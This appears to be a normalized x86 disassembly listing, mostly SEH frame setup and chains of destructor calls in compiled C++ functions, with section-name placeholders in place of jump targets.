lea ecx [ esp + 0x448 ]
mov [ esp + 0x474 ] 0x8
call sub_442148
lea ecx [ esp + 0x334 ]
mov [ esp + 0x474 ] 0x7
call sub_421723
lea ecx [ esp + 0x11c ]
mov [ esp + 0x474 ] 0x6
call sub_410040
lea ecx [ esp + 0x118 ]
mov [ esp + 0x474 ] 0x5
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x474 ] 0x4
call sub_442148
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x474 ] 0x3
call sub_44f0ac
lea ecx [ esp + 0x9c ]
mov [ esp + 0x474 ] 0x2
call sub_43c0ee
lea ecx [ esp + 0x60 ]
mov [ esp + 0x474 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x474 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x46c ]
mov [ fs : 0x0 ] ecx
add esp 0x478
retn
sub_410bd0
push 0xffffffff
push sub_45f405
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x330 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x134 ]
mov [ esp + 0x18 ] 0xd
call sub_442148
lea ecx [ edi + 0x128 ]
mov [ esp + 0x18 ] 0xc
call sub_442148
lea ecx [ edi + 0x124 ]
mov [ esp + 0x18 ] 0xb
call sub_442148
lea ecx [ edi + 0x120 ]
mov [ esp + 0x18 ] 0xa
call sub_442148
lea ecx [ edi + 0x11c ]
mov [ esp + 0x18 ] 0x9
call sub_442148
lea ecx [ edi + 0x118 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0x6
call sub_421723
lea ecx [ esi + 0x118 ]
mov [ esp + 0x18 ] 0x5
call sub_410040
lea ecx [ esi + 0x114 ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_442148
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_43c0ee
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_410d00
push 0xffffffff
push sub_45f4e4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x294
push 0x0
lea ecx [ esp + 0x8 ]
call sub_4151d0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x29c ] 0x0
call sub_43de8a
mov [ esp + 0x29c ] 0x1
lea eax [ esp + 0x15c ]
mov [ esp ] eax
lea ecx [ esp + 0x290 ]
mov [ esp + 0x29c ] 0xf
call sub_442148
lea ecx [ esp + 0x284 ]
mov [ esp + 0x29c ] 0xe
call sub_442148
lea ecx [ esp + 0x280 ]
mov [ esp + 0x29c ] 0xd
call sub_442148
lea ecx [ esp + 0x27c ]
mov [ esp + 0x29c ] 0xc
call sub_442148
lea ecx [ esp + 0x278 ]
mov [ esp + 0x29c ] 0xb
call sub_442148
lea ecx [ esp + 0x274 ]
mov [ esp + 0x29c ] 0xa
call sub_442148
lea ecx [ esp + 0x270 ]
mov [ esp + 0x29c ] 0x9
call sub_442148
lea ecx [ esp + 0x15c ]
mov [ esp + 0x29c ] 0x8
call sub_421723
lea ecx [ esp + 0x158 ]
mov [ esp + 0x29c ] 0x7
call sub_442148
lea ecx [ esp + 0x154 ]
mov [ esp + 0x29c ] 0x6
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x29c ] 0x5
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x29c ] 0x4
call sub_44f0ac
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x29c ] 0x3
call sub_44f0ac
lea ecx [ esp + 0x9c ]
mov [ esp + 0x29c ] 0x2
call sub_44f0ac
lea ecx [ esp + 0x60 ]
mov [ esp + 0x29c ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x29c ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x294 ]
mov [ fs : 0x0 ] ecx
add esp 0x2a0
retn
sub_410eb0
push 0xffffffff
push sub_45f5b3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x158 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x134 ]
mov [ esp + 0x18 ] 0xe
call sub_442148
lea ecx [ edi + 0x128 ]
mov [ esp + 0x18 ] 0xd
call sub_442148
lea ecx [ edi + 0x124 ]
mov [ esp + 0x18 ] 0xc
call sub_442148
lea ecx [ edi + 0x120 ]
mov [ esp + 0x18 ] 0xb
call sub_442148
lea ecx [ edi + 0x11c ]
mov [ esp + 0x18 ] 0xa
call sub_442148
lea ecx [ edi + 0x118 ]
mov [ esp + 0x18 ] 0x9
call sub_442148
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0x7
call sub_421723
lea ecx [ esi + 0x154 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x150 ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f0ac
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_410ff0
push 0xffffffff
push sub_45f63f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2ac
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40cae0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2b4 ] 0x0
call sub_43de8a
mov [ esp + 0x2b4 ] 0x1
lea eax [ esp + 0x194 ]
mov [ esp ] eax
lea ecx [ esp + 0x2a8 ]
mov [ esp + 0x2b4 ] 0xa
call sub_442148
lea ecx [ esp + 0x2a4 ]
mov [ esp + 0x2b4 ] 0x9
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x2b4 ] 0x8
call sub_421723
lea ecx [ esp + 0x190 ]
mov [ esp + 0x2b4 ] 0x7
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x2b4 ] 0x6
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x2b4 ] 0x5
call sub_44f046
lea ecx [ esp + 0x114 ]
mov [ esp + 0x2b4 ] 0x4
call sub_44f046
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x2b4 ] 0x3
call sub_44f046
lea ecx [ esp + 0x9c ]
mov [ esp + 0x2b4 ] 0x2
call sub_44f046
lea ecx [ esp + 0x60 ]
mov [ esp + 0x2b4 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2b4 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x2ac ]
mov [ fs : 0x0 ] ecx
add esp 0x2b8
retn
sub_411130
push 0xffffffff
push sub_45f6cf
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2ac
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40b400
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2b4 ] 0x0
call sub_43de8a
mov [ esp + 0x2b4 ] 0x1
lea eax [ esp + 0x194 ]
mov [ esp ] eax
lea ecx [ esp + 0x2a8 ]
mov [ esp + 0x2b4 ] 0xa
call sub_442148
lea ecx [ esp + 0x2a4 ]
mov [ esp + 0x2b4 ] 0x9
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x2b4 ] 0x8
call sub_421723
lea ecx [ esp + 0x190 ]
mov [ esp + 0x2b4 ] 0x7
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x2b4 ] 0x6
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x2b4 ] 0x5
call sub_44f046
lea ecx [ esp + 0x114 ]
mov [ esp + 0x2b4 ] 0x4
call sub_44f046
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x2b4 ] 0x3
call sub_44f046
lea ecx [ esp + 0x9c ]
mov [ esp + 0x2b4 ] 0x2
call sub_44f046
lea ecx [ esp + 0x60 ]
mov [ esp + 0x2b4 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2b4 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x2ac ]
mov [ fs : 0x0 ] ecx
add esp 0x2b8
retn
sub_411270
push 0xffffffff
push sub_45f743
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2a8
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40bff0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2b0 ] 0x0
call sub_43de8a
mov [ esp + 0x2b0 ] 0x1
lea eax [ esp + 0x190 ]
mov [ esp ] eax
lea ecx [ esp + 0x2a4 ]
mov [ esp + 0x2b0 ] 0x8
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x2b0 ] 0x7
call sub_421723
lea ecx [ esp + 0x18c ]
mov [ esp + 0x2b0 ] 0x6
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x2b0 ] 0x5
call sub_44f046
lea ecx [ esp + 0x114 ]
mov [ esp + 0x2b0 ] 0x4
call sub_44f046
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x2b0 ] 0x3
call sub_44f046
lea ecx [ esp + 0x9c ]
mov [ esp + 0x2b0 ] 0x2
call sub_44f046
lea ecx [ esp + 0x60 ]
mov [ esp + 0x2b0 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2b0 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x2a8 ]
mov [ fs : 0x0 ] ecx
add esp 0x2b4
retn
sub_411390
push 0xffffffff
push sub_45f7f0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x330
push 0x0
lea ecx [ esp + 0x8 ]
call sub_41f580
lea ecx [ esp + 0x4 ]
mov [ esp + 0x338 ] 0x0
call sub_43de8a
mov [ esp + 0x338 ] 0x1
lea eax [ esp + 0x214 ]
mov [ esp ] eax
lea ecx [ esp + 0x328 ]
mov [ esp + 0x338 ] 0xd
call sub_442148
lea ecx [ esp + 0x324 ]
mov [ esp + 0x338 ] 0xc
call sub_442148
lea ecx [ esp + 0x214 ]
mov [ esp + 0x338 ] 0xb
call sub_421723
lea ecx [ esp + 0x210 ]
mov [ esp + 0x338 ] 0xa
call sub_442148
lea ecx [ esp + 0x20c ]
mov [ esp + 0x338 ] 0x9
call sub_442148
lea ecx [ esp + 0x208 ]
mov [ esp + 0x338 ] 0x8
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x338 ] 0x7
call sub_43c0ee
lea ecx [ esp + 0x18c ]
mov [ esp + 0x338 ] 0x6
call sub_44f153
lea ecx [ esp + 0x150 ]
mov [ esp + 0x338 ] 0x5
call sub_44f153
lea ecx [ esp + 0x114 ]
mov [ esp + 0x338 ] 0x4
call sub_44f046
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x338 ] 0x3
call sub_44f046
lea ecx [ esp + 0x9c ]
mov [ esp + 0x338 ] 0x2
call sub_44f046
lea ecx [ esp + 0x60 ]
mov [ esp + 0x338 ] 0x1
call sub_44f046
lea ecx [ esp + 0x4 ]
mov [ esp + 0x338 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x330 ]
mov [ fs : 0x0 ] ecx
add esp 0x33c
retn
sub_411510
push 0xffffffff
push sub_45f8a7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x210 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0xc
call sub_442148
lea ecx [ edi + 0x110 ]
mov [ esp + 0x18 ] 0xb
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0xa
call sub_421723
lea ecx [ esi + 0x20c ]
mov [ esp + 0x18 ] 0x9
call sub_442148
lea ecx [ esi + 0x208 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
lea ecx [ esi + 0x204 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x1c4 ]
mov [ esp + 0x18 ] 0x6
call sub_43c0ee
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_44f153
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_44f153
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f046
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f046
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f046
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_44f046
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_411650
push 0xffffffff
push sub_45f93d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xdc
push esi
mov esi ecx
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40eff0
lea ecx [ esp + 0x4 ]
mov [ esp + 0xe8 ] 0x0
call sub_43de8a
cmp eax 0x1
je r-xdata
lea ecx [ esp + 0xdc ]
mov [ esp + 0xe8 ] 0x4
call sub_442148
lea ecx [ esp + 0xd8 ]
mov [ esp + 0xe8 ] 0x3
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0xe8 ] 0x2
call sub_44f0ac
mov [ esp + 0xe8 ] 0x1
jmp r-xdata
cmp eax 0x2
je r-xdata
lea ecx [ esp + 0x60 ]
call sub_44f153
lea ecx [ esp + 0x4 ]
mov [ esp + 0xe8 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xe0 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xe8
retn
push 0x0
push 0x1
push rw-data
call sub_4496b7
cmp eax 0x2
jne r-xdata
lea ecx [ esp + 0x4 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
mov ecx esi
call sub_44fde8
lea ecx [ esp + 0xdc ]
mov [ esp + 0xe8 ] 0xc
call sub_442148
lea ecx [ esp + 0xd8 ]
mov [ esp + 0xe8 ] 0xb
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0xe8 ] 0xa
call sub_44f0ac
mov [ esp + 0xe8 ] 0x9
lea ecx [ esp + 0xdc ]
mov [ esp + 0xe8 ] 0x8
call sub_442148
lea ecx [ esp + 0xd8 ]
mov [ esp + 0xe8 ] 0x7
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0xe8 ] 0x6
call sub_44f0ac
mov [ esp + 0xe8 ] 0x5
jmp r-xdata
sub_4117d0
push 0xffffffff
push sub_45f9d1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c8
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40d700
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1d0 ] 0x0
call sub_43de8a
mov [ esp + 0x1d0 ] 0x1
lea eax [ esp + 0x9c ]
mov [ esp ] eax
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x1d0 ] 0x8
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x1d0 ] 0x7
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x1d0 ] 0x6
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x1d0 ] 0x5
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x1d0 ] 0x4
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x1d0 ] 0x3
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0x1d0 ] 0x2
call sub_421723
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1d0 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1d0 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x1c8 ]
mov [ fs : 0x0 ] ecx
add esp 0x1d4
retn
sub_4118f0
push 0xffffffff
push sub_45faca
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2d4
push 0x0
lea ecx [ esp + 0x8 ]
call sub_417a10
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2dc ] 0x0
call sub_43de8a
mov [ esp + 0x2dc ] 0x1
lea eax [ esp + 0x19c ]
mov [ esp ] eax
lea ecx [ esp + 0x2d0 ]
mov [ esp + 0x2dc ] 0x11
call sub_442148
lea ecx [ esp + 0x2c4 ]
mov [ esp + 0x2dc ] 0x10
call sub_442148
lea ecx [ esp + 0x2c0 ]
mov [ esp + 0x2dc ] 0xf
call sub_442148
lea ecx [ esp + 0x2bc ]
mov [ esp + 0x2dc ] 0xe
call sub_442148
lea ecx [ esp + 0x2b8 ]
mov [ esp + 0x2dc ] 0xd
call sub_442148
lea ecx [ esp + 0x2b4 ]
mov [ esp + 0x2dc ] 0xc
call sub_442148
lea ecx [ esp + 0x2b0 ]
mov [ esp + 0x2dc ] 0xb
call sub_442148
lea ecx [ esp + 0x19c ]
mov [ esp + 0x2dc ] 0xa
call sub_421723
lea ecx [ esp + 0x198 ]
mov [ esp + 0x2dc ] 0x9
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x2dc ] 0x8
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x2dc ] 0x7
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x2dc ] 0x6
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x2dc ] 0x5
call sub_44f0ac
lea ecx [ esp + 0x114 ]
mov [ esp + 0x2dc ] 0x4
call sub_44f0ac
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x2dc ] 0x3
call sub_44f0ac
lea ecx [ esp + 0x9c ]
mov [ esp + 0x2dc ] 0x2
call sub_44f0ac
lea ecx [ esp + 0x60 ]
mov [ esp + 0x2dc ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2dc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x2d4 ]
mov [ fs : 0x0 ] ecx
add esp 0x2e0
retn
sub_411ac0
push 0xffffffff
push sub_45fbbf
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x198 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x134 ]
mov [ esp + 0x18 ] 0x10
call sub_442148
lea ecx [ edi + 0x128 ]
mov [ esp + 0x18 ] 0xf
call sub_442148
lea ecx [ edi + 0x124 ]
mov [ esp + 0x18 ] 0xe
call sub_442148
lea ecx [ edi + 0x120 ]
mov [ esp + 0x18 ] 0xd
call sub_442148
lea ecx [ edi + 0x11c ]
mov [ esp + 0x18 ] 0xc
call sub_442148
lea ecx [ edi + 0x118 ]
mov [ esp + 0x18 ] 0xb
call sub_442148
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0xa
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0x9
call sub_421723
lea ecx [ esi + 0x194 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
lea ecx [ esi + 0x190 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x18c ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_44f0ac
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f0ac
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_411c20
push 0xffffffff
push sub_45fc1f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x158
push 0x0
lea ecx [ esp + 0x4 ]
call sub_418340
lea ecx [ esp ]
mov [ esp + 0x160 ] 0x0
call sub_43de8a
lea ecx [ esp + 0x154 ]
mov [ esp + 0x160 ] 0x7
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x160 ] 0x6
call sub_442148
lea ecx [ esp + 0x14c ]
mov [ esp + 0x160 ] 0x5
call sub_442148
lea ecx [ esp + 0x110 ]
mov [ esp + 0x160 ] 0x4
call sub_44f0ac
lea ecx [ esp + 0xd4 ]
mov [ esp + 0x160 ] 0x3
call sub_44f0ac
lea ecx [ esp + 0x98 ]
mov [ esp + 0x160 ] 0x2
call sub_44f0ac
lea ecx [ esp + 0x5c ]
mov [ esp + 0x160 ] 0x1
call sub_43c0ee
lea ecx [ esp ]
mov [ esp + 0x160 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x158 ]
mov [ fs : 0x0 ] ecx
add esp 0x164
retn
sub_411d10
push 0xffffffff
push sub_45fc89
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x154 ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0x150 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x3
call sub_44f0ac
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x10 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_411dc0
push 0xffffffff
push sub_45fd32
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c8
push 0x0
lea ecx [ esp + 0x8 ]
call sub_402b00
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1d0 ] 0x0
call sub_43de8a
mov [ esp + 0x1d0 ] 0x1
lea eax [ esp + 0x9c ]
mov [ esp ] eax
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x1d0 ] 0x9
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x1d0 ] 0x8
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x1d0 ] 0x7
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x1d0 ] 0x6
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x1d0 ] 0x5
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x1d0 ] 0x4
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x1d0 ] 0x3
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0x1d0 ] 0x2
call sub_421723
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1d0 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1d0 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x1c8 ]
mov [ fs : 0x0 ] ecx
add esp 0x1d4
retn
sub_411ef0
push 0xffffffff
push sub_45fdb0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c0
push 0x0
lea ecx [ esp + 0x8 ]
call sub_404ce0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1c8 ] 0x0
call sub_43de8a
mov [ esp + 0x1c8 ] 0x1
lea eax [ esp + 0x9c ]
mov [ esp ] eax
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x1c8 ] 0x7
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x1c8 ] 0x6
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x1c8 ] 0x5
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x1c8 ] 0x4
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x1c8 ] 0x3
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0x1c8 ] 0x2
call sub_421723
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1c8 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1c8 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x1c0 ]
mov [ fs : 0x0 ] ecx
add esp 0x1cc
retn
sub_412000
push 0xffffffff
push sub_45fe41
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c4
push 0x0
lea ecx [ esp + 0x8 ]
call sub_406340
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1cc ] 0x0
call sub_43de8a
mov [ esp + 0x1cc ] 0x1
lea eax [ esp + 0x9c ]
mov [ esp ] eax
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x1cc ] 0x8
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x1cc ] 0x7
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x1cc ] 0x6
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x1cc ] 0x5
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x1cc ] 0x4
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x1cc ] 0x3
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0x1cc ] 0x2
call sub_421723
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1cc ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1cc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x1c4 ]
mov [ fs : 0x0 ] ecx
add esp 0x1d0
retn
sub_412120
push 0xffffffff
push sub_45fec0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c0
push 0x0
lea ecx [ esp + 0x8 ]
call sub_407c20
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1c8 ] 0x0
call sub_43de8a
mov [ esp + 0x1c8 ] 0x1
lea eax [ esp + 0x9c ]
mov [ esp ] eax
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x1c8 ] 0x7
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x1c8 ] 0x6
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x1c8 ] 0x5
call sub_442148
lea ecx [ esp + 0x1b0 ]
mov [ esp + 0x1c8 ] 0x4
call sub_442148
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x1c8 ] 0x3
call sub_442148
lea ecx [ esp + 0x9c ]
mov [ esp + 0x1c8 ] 0x2
call sub_421723
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1c8 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1c8 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x1c0 ]
mov [ fs : 0x0 ] ecx
add esp 0x1cc
retn
sub_412230
push 0xffffffff
push sub_45ff51
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c4
push 0x0
lea ecx [ esp + 0x8 ]
call sub_401000
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1cc ] 0x0
call sub_43de8a
mov [ esp + 0x1cc ] 0x1
lea eax [ esp + 0x9c ]
mov [ esp ] eax
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x1cc ] 0x8
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x1cc ] 0x7
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x1cc ] 0x6
call sub_442148
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x1cc ] 0x5
call sub_442148
